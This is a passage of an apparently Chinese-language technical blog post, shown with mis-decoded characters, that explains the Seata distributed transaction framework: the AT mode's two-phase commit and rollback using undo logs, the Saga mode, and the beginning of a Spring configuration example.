<p>äºŒé˜¶æ®µå¦‚æœæ˜¯å›æ»šçš„è¯ï¼ŒSeata å°±éœ€è¦å›æ»šä¸€é˜¶æ®µå·²ç»æ‰§è¡Œçš„â€œ<code>ä¸šåŠ¡ SQL</code>â€ï¼Œè¿˜åŸä¸šåŠ¡æ•°æ®ã€‚å›æ»šæ–¹å¼ä¾¿æ˜¯ç”¨â€œ<code>before image</code>â€è¿˜åŸä¸šåŠ¡æ•°æ®ï¼›ä½†åœ¨è¿˜åŸå‰è¦é¦–å…ˆè¦æ ¡éªŒè„å†™ï¼Œå¯¹æ¯”â€œæ•°æ®åº“å½“å‰ä¸šåŠ¡æ•°æ®â€å’Œ â€œ<code>after image</code>â€ï¼Œå¦‚æœä¸¤ä»½æ•°æ®å®Œå…¨ä¸€è‡´å°±è¯´æ˜æ²¡æœ‰è„å†™ï¼Œå¯ä»¥è¿˜åŸä¸šåŠ¡æ•°æ®ï¼Œå¦‚æœä¸ä¸€è‡´å°±è¯´æ˜æœ‰<code>è„å†™</code>ï¼Œå‡ºç°è„å†™å°±éœ€è¦è½¬äººå·¥å¤„ç†ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149756.png" alt="image-20200305214649845"></p>
<p>ä¸è¿‡å› ä¸ºæœ‰å…¨å±€é”æœºåˆ¶ï¼Œæ‰€ä»¥å¯ä»¥é™ä½å‡ºç°<code>è„å†™</code>çš„æ¦‚ç‡ã€‚</p>
<p>AT æ¨¡å¼çš„ä¸€é˜¶æ®µã€äºŒé˜¶æ®µæäº¤å’Œå›æ»šå‡ç”± Seata æ¡†æ¶è‡ªåŠ¨ç”Ÿæˆï¼Œç”¨æˆ·åªéœ€ç¼–å†™â€œä¸šåŠ¡ SQLâ€ï¼Œä¾¿èƒ½è½»æ¾æ¥å…¥åˆ†å¸ƒå¼äº‹åŠ¡ï¼ŒAT æ¨¡å¼æ˜¯ä¸€ç§å¯¹ä¸šåŠ¡æ— ä»»ä½•ä¾µå…¥çš„åˆ†å¸ƒå¼äº‹åŠ¡è§£å†³æ–¹æ¡ˆã€‚</p>
<h4 id="è¯¦ç»†æ¶æ„å’Œæµç¨‹"><a href="#è¯¦ç»†æ¶æ„å’Œæµç¨‹" class="headerlink" title="è¯¦ç»†æ¶æ„å’Œæµç¨‹"></a>è¯¦ç»†æ¶æ„å’Œæµç¨‹</h4><p>Seataä¸­çš„å‡ ä¸ªåŸºæœ¬æ¦‚å¿µï¼š</p>
<ul>
<li><p>TCï¼ˆTransaction Coordinatorï¼‰ - äº‹åŠ¡åè°ƒè€…</p>
<p>ç»´æŠ¤å…¨å±€å’Œåˆ†æ”¯äº‹åŠ¡çš„çŠ¶æ€ï¼Œé©±åŠ¨å…¨å±€äº‹åŠ¡æäº¤æˆ–å›æ»šï¼ˆTMä¹‹é—´çš„åè°ƒè€…ï¼‰ã€‚</p>
</li>
<li><p>TMï¼ˆTransaction Managerï¼‰ - äº‹åŠ¡ç®¡ç†å™¨</p>
<p>å®šä¹‰å…¨å±€äº‹åŠ¡çš„èŒƒå›´ï¼šå¼€å§‹å…¨å±€äº‹åŠ¡ã€æäº¤æˆ–å›æ»šå…¨å±€äº‹åŠ¡ã€‚</p>
</li>
<li><p>RMï¼ˆResource Managerï¼‰ - èµ„æºç®¡ç†å™¨</p>
<p>ç®¡ç†åˆ†æ”¯äº‹åŠ¡å¤„ç†çš„èµ„æºï¼Œä¸TCäº¤è°ˆä»¥æ³¨å†Œåˆ†æ”¯äº‹åŠ¡å’ŒæŠ¥å‘Šåˆ†æ”¯äº‹åŠ¡çš„çŠ¶æ€ï¼Œå¹¶é©±åŠ¨åˆ†æ”¯äº‹åŠ¡æäº¤æˆ–å›æ»šã€‚</p>
</li>
</ul>
<p>æˆ‘ä»¬çœ‹ä¸‹é¢çš„ä¸€ä¸ªæ¶æ„å›¾</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149757.png" alt="image-20200305225811888"></p>
<ul>
<li>TMï¼šä¸šåŠ¡æ¨¡å—ä¸­å…¨å±€äº‹åŠ¡çš„å¼€å¯è€…<ul>
<li>å‘TCå¼€å¯ä¸€ä¸ªå…¨å±€äº‹åŠ¡</li>
<li>è°ƒç”¨å…¶å®ƒå¾®æœåŠ¡</li>
</ul>
</li>
<li>RMï¼šä¸šåŠ¡æ¨¡å—æ‰§è¡Œè€…ä¸­ï¼ŒåŒ…å«RMéƒ¨åˆ†ï¼Œè´Ÿè´£å‘TCæ±‡æŠ¥äº‹åŠ¡æ‰§è¡ŒçŠ¶æ€<ul>
<li>æ‰§è¡Œæœ¬åœ°äº‹åŠ¡</li>
<li>å‘TCæ³¨å†Œåˆ†æ”¯äº‹åŠ¡ï¼Œå¹¶æäº¤æœ¬åœ°äº‹åŠ¡æ‰§è¡Œç»“æœ</li>
</ul>
</li>
<li>TMï¼šç»“æŸå¯¹å¾®æœåŠ¡çš„è°ƒç”¨ï¼Œé€šçŸ¥TCï¼Œå…¨å±€äº‹åŠ¡æ‰§è¡Œå®Œæ¯•ï¼Œäº‹åŠ¡ä¸€é˜¶æ®µç»“æŸ</li>
<li>TCï¼šæ±‡æ€»å„ä¸ªåˆ†æ”¯äº‹åŠ¡æ‰§è¡Œç»“æœï¼Œå†³å®šåˆ†å¸ƒå¼äº‹åŠ¡æ˜¯æäº¤è¿˜æ˜¯å›æ»šï¼›</li>
<li>TC é€šçŸ¥æ‰€æœ‰ RM æäº¤&#x2F;å›æ»š èµ„æºï¼Œäº‹åŠ¡äºŒé˜¶æ®µç»“æŸã€‚</li>
</ul>
<p>ä¸€é˜¶æ®µï¼š</p>
<ul>
<li>TMå¼€å¯å…¨å±€äº‹åŠ¡ï¼Œå¹¶å‘TCå£°æ˜å…¨å±€äº‹åŠ¡ï¼ŒåŒ…æ‹¬å…¨å±€äº‹åŠ¡XIDä¿¡æ¯</li>
<li>TMæ‰€åœ¨æœåŠ¡è°ƒç”¨å…¶å®ƒå¾®æœåŠ¡</li>
<li>å¾®æœåŠ¡ï¼Œä¸»è¦æœ‰RMæ¥æ‰§è¡Œ<ul>
<li>æŸ¥è¯¢<code>before_image</code></li>
<li>æ‰§è¡Œæœ¬åœ°äº‹åŠ¡</li>
<li>æŸ¥è¯¢<code>after_image</code></li>
<li>ç”Ÿæˆ<code>undo_log</code>å¹¶å†™å…¥æ•°æ®åº“</li>
<li>å‘TCæ³¨å†Œåˆ†æ”¯äº‹åŠ¡ï¼Œå‘ŠçŸ¥äº‹åŠ¡æ‰§è¡Œç»“æœ</li>
<li>è·å–å…¨å±€é”ï¼ˆé˜»æ­¢å…¶å®ƒå…¨å±€äº‹åŠ¡å¹¶å‘ä¿®æ”¹å½“å‰æ•°æ®ï¼‰</li>
<li>é‡Šæ”¾æœ¬åœ°é”ï¼ˆä¸å½±å“å…¶å®ƒä¸šåŠ¡å¯¹æ•°æ®çš„æ“ä½œï¼‰</li>
</ul>
</li>
<li>å¾…æ‰€æœ‰ä¸šåŠ¡æ‰§è¡Œå®Œæ¯•ï¼Œäº‹åŠ¡å‘èµ·è€…ï¼ˆTMï¼‰ä¼šå°è¯•å‘TCæäº¤å…¨å±€äº‹åŠ¡</li>
</ul>
<p>äºŒé˜¶æ®µï¼š</p>
<ul>
<li>TCç»Ÿè®¡åˆ†æ”¯äº‹åŠ¡æ‰§è¡Œæƒ…å†µï¼Œæ ¹æ®ç»“æœåˆ¤æ–­ä¸‹ä¸€æ­¥è¡Œä¸º<ul>
<li>åˆ†æ”¯éƒ½æˆåŠŸï¼šé€šçŸ¥åˆ†æ”¯äº‹åŠ¡ï¼Œæäº¤äº‹åŠ¡</li>
<li>æœ‰åˆ†æ”¯æ‰§è¡Œå¤±è´¥ï¼šé€šçŸ¥æ‰§è¡ŒæˆåŠŸçš„åˆ†æ”¯äº‹åŠ¡ï¼Œå›æ»šæ•°æ®</li>
</ul>
</li>
<li>åˆ†æ”¯äº‹åŠ¡çš„RM<ul>
<li>æäº¤äº‹åŠ¡ï¼šç›´æ¥æ¸…ç©º<code>before_image</code>å’Œ<code>after_image</code>ä¿¡æ¯ï¼Œé‡Šæ”¾å…¨å±€é”</li>
<li>å›æ»šäº‹åŠ¡ï¼š<ul>
<li>æ ¡éªŒafter_imageï¼Œåˆ¤æ–­æ˜¯å¦æœ‰è„å†™</li>
<li>å¦‚æœæ²¡æœ‰è„å†™ï¼Œå›æ»šæ•°æ®åˆ°<code>before_image</code>ï¼Œæ¸…é™¤<code>before_image</code>å’Œ<code>after_image</code></li>
<li>å¦‚æœæœ‰è„å†™ï¼Œè¯·æ±‚äººå·¥ä»‹å…¥</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="å·¥ä½œæœºåˆ¶"><a href="#å·¥ä½œæœºåˆ¶" class="headerlink" title="å·¥ä½œæœºåˆ¶"></a>å·¥ä½œæœºåˆ¶</h4><p>è¯¦è§Seataçš„å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://seata.io/zh-cn/docs/overview/what-is-seata.html">https://seata.io/zh-cn/docs/overview/what-is-seata.html</a></p>
<blockquote>
<h4 id="åœºæ™¯"><a href="#åœºæ™¯" class="headerlink" title="åœºæ™¯"></a>åœºæ™¯</h4></blockquote>
<p>ä»¥ä¸€ä¸ªç¤ºä¾‹æ¥è¯´æ˜æ•´ä¸ª AT åˆ†æ”¯çš„å·¥ä½œè¿‡ç¨‹ã€‚</p>
<p>ä¸šåŠ¡è¡¨ï¼š<code>product</code></p>
<table>
<thead>
<tr>
<th>Field</th>
<th>Type</th>
<th>Key</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>bigint(20)</td>
<td>PRI</td>
</tr>
<tr>
<td>name</td>
<td>varchar(100)</td>
<td></td>
</tr>
<tr>
<td>since</td>
<td>varchar(100)</td>
<td></td>
</tr>
</tbody></table>
<p>AT åˆ†æ”¯äº‹åŠ¡çš„ä¸šåŠ¡é€»è¾‘ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> product <span class="keyword">set</span> name <span class="operator">=</span> <span class="string">&#x27;GTS&#x27;</span> <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;TXC&#x27;</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<h4 id="ä¸€é˜¶æ®µ"><a href="#ä¸€é˜¶æ®µ" class="headerlink" title="ä¸€é˜¶æ®µ"></a>ä¸€é˜¶æ®µ</h4></blockquote>
<p>è¿‡ç¨‹ï¼š</p>
<ol>
<li>è§£æ SQLï¼šå¾—åˆ° SQL çš„ç±»å‹ï¼ˆUPDATEï¼‰ï¼Œè¡¨ï¼ˆproductï¼‰ï¼Œæ¡ä»¶ï¼ˆwhere name &#x3D; â€˜TXCâ€™ï¼‰ç­‰ç›¸å…³çš„ä¿¡æ¯ã€‚</li>
<li>æŸ¥è¯¢å‰é•œåƒï¼šæ ¹æ®è§£æå¾—åˆ°çš„æ¡ä»¶ä¿¡æ¯ï¼Œç”ŸæˆæŸ¥è¯¢è¯­å¥ï¼Œå®šä½æ•°æ®ã€‚</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id, name, since <span class="keyword">from</span> product <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;TXC&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°å‰é•œåƒï¼š</p>
<table>
<thead>
<tr>
<th>id</th>
<th>name</th>
<th>since</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>TXC</td>
<td>2014</td>
</tr>
</tbody></table>
<ol>
<li>æ‰§è¡Œä¸šåŠ¡ SQLï¼šæ›´æ–°è¿™æ¡è®°å½•çš„ name ä¸º â€˜GTSâ€™ã€‚</li>
<li>æŸ¥è¯¢åé•œåƒï¼šæ ¹æ®å‰é•œåƒçš„ç»“æœï¼Œé€šè¿‡ <strong>ä¸»é”®</strong> å®šä½æ•°æ®ã€‚</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id, name, since <span class="keyword">from</span> product <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>`;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°åé•œåƒï¼š</p>
<table>
<thead>
<tr>
<th>id</th>
<th>name</th>
<th>since</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>GTS</td>
<td>2014</td>
</tr>
</tbody></table>
<ol>
<li>æ’å…¥å›æ»šæ—¥å¿—ï¼šæŠŠå‰åé•œåƒæ•°æ®ä»¥åŠä¸šåŠ¡ SQL ç›¸å…³çš„ä¿¡æ¯ç»„æˆä¸€æ¡å›æ»šæ—¥å¿—è®°å½•ï¼Œæ’å…¥åˆ° <code>UNDO_LOG</code> è¡¨ä¸­ã€‚</li>
</ol>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;branchId&quot;</span><span class="punctuation">:</span> <span class="number">641789253</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;undoItems&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;afterImage&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;rows&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">				<span class="attr">&quot;fields&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;id&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="number">4</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">				<span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;name&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="number">12</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GTS&quot;</span></span><br><span class="line">				<span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;since&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="number">12</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2014&quot;</span></span><br><span class="line">				<span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">			<span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;tableName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;product&quot;</span></span><br><span class="line">		<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;beforeImage&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;rows&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">				<span class="attr">&quot;fields&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;id&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="number">4</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">				<span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;name&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="number">12</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;TXC&quot;</span></span><br><span class="line">				<span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;since&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="number">12</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2014&quot;</span></span><br><span class="line">				<span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">			<span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;tableName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;product&quot;</span></span><br><span class="line">		<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;sqlType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UPDATE&quot;</span></span><br><span class="line">	<span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;xid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xid:xxx&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ol>
<li>æäº¤å‰ï¼Œå‘ TC æ³¨å†Œåˆ†æ”¯ï¼šç”³è¯· <code>product</code> è¡¨ä¸­ï¼Œä¸»é”®å€¼ç­‰äº 1 çš„è®°å½•çš„ <strong>å…¨å±€é”</strong> ã€‚</li>
<li>æœ¬åœ°äº‹åŠ¡æäº¤ï¼šä¸šåŠ¡æ•°æ®çš„æ›´æ–°å’Œå‰é¢æ­¥éª¤ä¸­ç”Ÿæˆçš„ UNDO LOG ä¸€å¹¶æäº¤ã€‚</li>
<li>å°†æœ¬åœ°äº‹åŠ¡æäº¤çš„ç»“æœä¸ŠæŠ¥ç»™ TCã€‚</li>
</ol>
<blockquote>
<h4 id="äºŒé˜¶æ®µ-å›æ»š"><a href="#äºŒé˜¶æ®µ-å›æ»š" class="headerlink" title="äºŒé˜¶æ®µ-å›æ»š"></a>äºŒé˜¶æ®µ-å›æ»š</h4></blockquote>
<ol>
<li>æ”¶åˆ° TC çš„åˆ†æ”¯å›æ»šè¯·æ±‚ï¼Œå¼€å¯ä¸€ä¸ªæœ¬åœ°äº‹åŠ¡ï¼Œæ‰§è¡Œå¦‚ä¸‹æ“ä½œã€‚</li>
<li>é€šè¿‡ XID å’Œ Branch ID æŸ¥æ‰¾åˆ°ç›¸åº”çš„ UNDO LOG è®°å½•ã€‚</li>
<li>æ•°æ®æ ¡éªŒï¼šæ‹¿ UNDO LOG ä¸­çš„åé•œä¸å½“å‰æ•°æ®è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœæœ‰ä¸åŒï¼Œè¯´æ˜æ•°æ®è¢«å½“å‰å…¨å±€äº‹åŠ¡ä¹‹å¤–çš„åŠ¨ä½œåšäº†ä¿®æ”¹ã€‚è¿™ç§æƒ…å†µï¼Œéœ€è¦æ ¹æ®é…ç½®ç­–ç•¥æ¥åšå¤„ç†ï¼Œè¯¦ç»†çš„è¯´æ˜åœ¨å¦å¤–çš„æ–‡æ¡£ä¸­ä»‹ç»ã€‚</li>
<li>æ ¹æ® UNDO LOG ä¸­çš„å‰é•œåƒå’Œä¸šåŠ¡ SQL çš„ç›¸å…³ä¿¡æ¯ç”Ÿæˆå¹¶æ‰§è¡Œå›æ»šçš„è¯­å¥ï¼š</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> product <span class="keyword">set</span> name <span class="operator">=</span> <span class="string">&#x27;TXC&#x27;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<ol>
<li>æäº¤æœ¬åœ°äº‹åŠ¡ã€‚å¹¶æŠŠæœ¬åœ°äº‹åŠ¡çš„æ‰§è¡Œç»“æœï¼ˆå³åˆ†æ”¯äº‹åŠ¡å›æ»šçš„ç»“æœï¼‰ä¸ŠæŠ¥ç»™ TCã€‚</li>
</ol>
<blockquote>
<h4 id="äºŒé˜¶æ®µ-æäº¤"><a href="#äºŒé˜¶æ®µ-æäº¤" class="headerlink" title="äºŒé˜¶æ®µ-æäº¤"></a>äºŒé˜¶æ®µ-æäº¤</h4></blockquote>
<ol>
<li>æ”¶åˆ° TC çš„åˆ†æ”¯æäº¤è¯·æ±‚ï¼ŒæŠŠè¯·æ±‚æ”¾å…¥ä¸€ä¸ªå¼‚æ­¥ä»»åŠ¡çš„é˜Ÿåˆ—ä¸­ï¼Œé©¬ä¸Šè¿”å›æäº¤æˆåŠŸçš„ç»“æœç»™ TCã€‚</li>
<li>å¼‚æ­¥ä»»åŠ¡é˜¶æ®µçš„åˆ†æ”¯æäº¤è¯·æ±‚å°†å¼‚æ­¥å’Œæ‰¹é‡åœ°åˆ é™¤ç›¸åº” UNDO LOG è®°å½•ã€‚</li>
</ol>
<h4 id="ä¼˜ç¼ºç‚¹"><a href="#ä¼˜ç¼ºç‚¹" class="headerlink" title="ä¼˜ç¼ºç‚¹"></a>ä¼˜ç¼ºç‚¹</h4><p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>ä¸2PCç›¸æ¯”ï¼šæ¯ä¸ªåˆ†æ”¯äº‹åŠ¡éƒ½æ˜¯ç‹¬ç«‹æäº¤ï¼Œä¸äº’ç›¸ç­‰å¾…ï¼Œå‡å°‘äº†èµ„æºé”å®šå’Œé˜»å¡æ—¶é—´</li>
<li>ä¸TCCç›¸æ¯”ï¼šäºŒé˜¶æ®µçš„æ‰§è¡Œæ“ä½œå…¨éƒ¨è‡ªåŠ¨åŒ–ç”Ÿæˆï¼Œæ— ä»£ç ä¾µå…¥ï¼Œå¼€å‘æˆæœ¬ä½</li>
</ul>
<p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>ä¸TCCç›¸æ¯”ï¼Œéœ€è¦åŠ¨æ€ç”ŸæˆäºŒé˜¶æ®µçš„åå‘è¡¥å¿æ“ä½œï¼Œæ‰§è¡Œæ€§èƒ½ç•¥ä½äºTCC</li>
</ul>
<h3 id="Sagaæ¨¡å¼"><a href="#Sagaæ¨¡å¼" class="headerlink" title="Sagaæ¨¡å¼"></a>Sagaæ¨¡å¼</h3><p>Saga [ËˆsÉ‘ËÉ¡É™]æ¨¡å¼æ˜¯ Seata å³å°†å¼€æºçš„é•¿äº‹åŠ¡è§£å†³æ–¹æ¡ˆï¼Œå°†ç”±èš‚èšé‡‘æœä¸»è¦è´¡çŒ®ã€‚</p>
<p>å…¶ç†è®ºåŸºç¡€æ˜¯Hector &amp; Kenneth  åœ¨1987å¹´å‘è¡¨çš„è®ºæ–‡<a href="https://microservices.io/patterns/data/saga.html">Sagas</a>ã€‚</p>
<p>Seataå®˜ç½‘å¯¹äºSagaçš„æŒ‡å—ï¼š<a href="https://seata.io/zh-cn/docs/user/saga.html">https://seata.io/zh-cn/docs/user/saga.html</a></p>
<h4 id="åŸºæœ¬æ¨¡å‹"><a href="#åŸºæœ¬æ¨¡å‹" class="headerlink" title="åŸºæœ¬æ¨¡å‹"></a>åŸºæœ¬æ¨¡å‹</h4><p>åœ¨ Saga æ¨¡å¼ä¸‹ï¼Œåˆ†å¸ƒå¼äº‹åŠ¡å†…æœ‰å¤šä¸ªå‚ä¸è€…ï¼Œæ¯ä¸€ä¸ªå‚ä¸è€…éƒ½æ˜¯ä¸€ä¸ªå†²æ­£è¡¥å¿æœåŠ¡ï¼Œéœ€è¦ç”¨æˆ·æ ¹æ®ä¸šåŠ¡åœºæ™¯å®ç°å…¶æ­£å‘æ“ä½œå’Œé€†å‘å›æ»šæ“ä½œã€‚</p>
<p>åˆ†å¸ƒå¼äº‹åŠ¡æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œä¾æ¬¡æ‰§è¡Œå„å‚ä¸è€…çš„æ­£å‘æ“ä½œï¼Œå¦‚æœæ‰€æœ‰æ­£å‘æ“ä½œå‡æ‰§è¡ŒæˆåŠŸï¼Œé‚£ä¹ˆåˆ†å¸ƒå¼äº‹åŠ¡æäº¤ã€‚å¦‚æœä»»ä½•ä¸€ä¸ªæ­£å‘æ“ä½œæ‰§è¡Œå¤±è´¥ï¼Œé‚£ä¹ˆåˆ†å¸ƒå¼äº‹åŠ¡ä¼šå»é€€å›å»æ‰§è¡Œå‰é¢å„å‚ä¸è€…çš„é€†å‘å›æ»šæ“ä½œï¼Œå›æ»šå·²æäº¤çš„å‚ä¸è€…ï¼Œä½¿åˆ†å¸ƒå¼äº‹åŠ¡å›åˆ°åˆå§‹çŠ¶æ€ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149758.png" alt="Saga æ¨¡å¼"> </p>
<p>Saga æ¨¡å¼ä¸‹åˆ†å¸ƒå¼äº‹åŠ¡é€šå¸¸æ˜¯ç”±äº‹ä»¶é©±åŠ¨çš„ï¼Œå„ä¸ªå‚ä¸è€…ä¹‹é—´æ˜¯å¼‚æ­¥æ‰§è¡Œçš„ï¼ŒSaga æ¨¡å¼æ˜¯ä¸€ç§é•¿äº‹åŠ¡è§£å†³æ–¹æ¡ˆã€‚</p>
<h4 id="é€‚ç”¨åœºæ™¯"><a href="#é€‚ç”¨åœºæ™¯" class="headerlink" title="é€‚ç”¨åœºæ™¯"></a>é€‚ç”¨åœºæ™¯</h4><ul>
<li>ä¸šåŠ¡æµç¨‹é•¿ã€ä¸šåŠ¡æµç¨‹å¤š</li>
<li>å‚ä¸è€…åŒ…å«å…¶å®ƒå…¬å¸æˆ–é—ç•™ç³»ç»ŸæœåŠ¡ï¼Œæ— æ³•æä¾› TCC æ¨¡å¼è¦æ±‚çš„ä¸‰ä¸ªæ¥å£</li>
</ul>
<h4 id="ä¼˜åŠ¿"><a href="#ä¼˜åŠ¿" class="headerlink" title="ä¼˜åŠ¿"></a>ä¼˜åŠ¿</h4><ul>
<li>ä¸€é˜¶æ®µæäº¤æœ¬åœ°äº‹åŠ¡ï¼Œæ— é”ï¼Œé«˜æ€§èƒ½</li>
<li>äº‹ä»¶é©±åŠ¨æ¶æ„ï¼Œå‚ä¸è€…å¯å¼‚æ­¥æ‰§è¡Œï¼Œé«˜åå</li>
<li>è¡¥å¿æœåŠ¡æ˜“äºå®ç°</li>
</ul>
<h4 id="ç¼ºç‚¹"><a href="#ç¼ºç‚¹" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h4><ul>
<li>ä¸ä¿è¯éš”ç¦»æ€§ï¼ˆåº”å¯¹æ–¹æ¡ˆè§<a href="https://seata.io/zh-cn/docs/user/saga.html">ç”¨æˆ·æ–‡æ¡£</a>ï¼‰</li>
</ul>
<h2 id="Seata"><a href="#Seata" class="headerlink" title="Seata"></a>Seata</h2><p>Seataï¼ˆSimple Extensible Autonomous Transaction Architectureï¼Œç®€å•å¯æ‰©å±•è‡ªæ²»äº‹åŠ¡æ¡†æ¶ï¼‰æ˜¯ 2019 å¹´ 1 æœˆä»½èš‚èšé‡‘æœå’Œé˜¿é‡Œå·´å·´å…±åŒå¼€æºçš„åˆ†å¸ƒå¼äº‹åŠ¡è§£å†³æ–¹æ¡ˆã€‚Seata å¼€æºåŠå¹´å·¦å³ï¼Œç›®å‰å·²ç»æœ‰æ¥è¿‘ä¸€ä¸‡ starï¼Œç¤¾åŒºéå¸¸æ´»è·ƒã€‚æˆ‘ä»¬çƒ­å¿±æ¬¢è¿å¤§å®¶å‚ä¸åˆ° Seata ç¤¾åŒºå»ºè®¾ä¸­ï¼Œä¸€åŒå°† Seata æ‰“é€ æˆå¼€æºåˆ†å¸ƒå¼äº‹åŠ¡æ ‡æ†äº§å“ã€‚</p>
<p>Seataï¼š<a href="https://github.com/seata/seata">https:&#x2F;&#x2F;</a><a href="https://github.com/seata/seata">github.com&#x2F;seata&#x2F;seata</a></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149759.png" alt="image-20210415162035629"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149760.png" alt="image-20210415162052256"></p>
<h3 id="ATæ¨¡å¼å®æˆ˜"><a href="#ATæ¨¡å¼å®æˆ˜" class="headerlink" title="ATæ¨¡å¼å®æˆ˜"></a>ATæ¨¡å¼å®æˆ˜</h3><p>é¦–å…ˆåœ¨application.ymlä¸­æ·»åŠ ä¸€è¡Œé…ç½®ï¼š</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">alibaba:</span></span><br><span class="line">      <span class="attr">seata:</span></span><br><span class="line">        <span class="attr">tx-service-group:</span> <span class="string">test_tx_group</span> <span class="comment"># å®šä¹‰äº‹åŠ¡ç»„çš„åç§°</span></span><br></pre></td></tr></table></figure>

